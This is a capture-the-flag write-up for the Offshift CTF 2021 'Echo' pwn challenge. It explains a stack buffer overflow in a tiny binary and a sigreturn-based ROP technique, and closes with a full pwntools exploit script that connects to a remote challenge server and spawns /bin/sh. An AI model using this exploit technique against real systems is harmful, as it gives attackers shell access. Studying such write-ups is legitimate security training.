<h1>Offshift CTF 2021 - Echo</h1>

<h2>Binary Exploitation - 485 pts</h2>

<h3>Writeup by YR81</h3>

<h4>Discussion</h4>

<h5>Program Behavior</h5>

<p>This challenge featured a particularly tiny binary - it's so small that we can show the entirety of it in one snapshot:</p>

<img src = "./images/os2021_echo_1.png">

<p>There are two "procedures" - one at the entrypoint which simply calls <code>echo()</code> then performs an <code>exit()</code> syscall, and <code>echo()</code> which <code>read()</code>s 0x300 bytes from the input and <code>write()</code>s exactly what was entered, then returns. Note that there is a buffer overflow here, since the buffer starts at <code>rbp - 0x180</code>. In between these two procedures there is a string <code>/bin/sh</code> which should be useful.</p>

<h5>Sigreturn and ROP</h5>

<p>We notice that there are not many <code>ret</code> ROP gadgets and especially no <code>syscall; ret</code> gadgets that are needed for traditional sigreturn payloads [1]. However, we can still use some ideas from sigreturn exploitation. Specifically, note that the value of <code>rax</code> after the call to <code>echo()</code> is set to the size of the input. All we need to do is load a <code>syscall</code> gadget and a signal frame on the stack, then return to <code>echo()</code>.</p>

<p class = "caption">Figure 2. Initial payload to overflow the buffer and load gadgets and sigreturn frame on the stack.</p>

<p>The second time we run <code>echo()</code>, we do not need to overflow the buffer since the ROP chain is already set up on the stack. We just need to write 15 arbitrary characters (15 = 0xf is the syscall number for <code>sigreturn()</code>), and this time, returning to the <code>syscall</code> gadget will update the registers, jump to <code>syscall</code> again via <code>sigreturnframe.rip</code> and give us a shell.</p>

<h4>Payload</h4>

<pre class = "python">

from pwn import *

p = remote("185.172.165.118", 9090)

echo = 0x401000
binsh = 0x401035
syscall = 0x40104c

context.clear(arch = "amd64")
s = SigreturnFrame()
s.rip = syscall
s.rax = 0x3b
s.rdi = binsh
s.rsi = 0
s.rdx = 0

p.send(0x180 * b'A' + p64(0xdeadbeef) + p64(echo) + p64(syscall) + bytes(s))

p.recv()
p.send(0xf * b'A')

p.interactive()
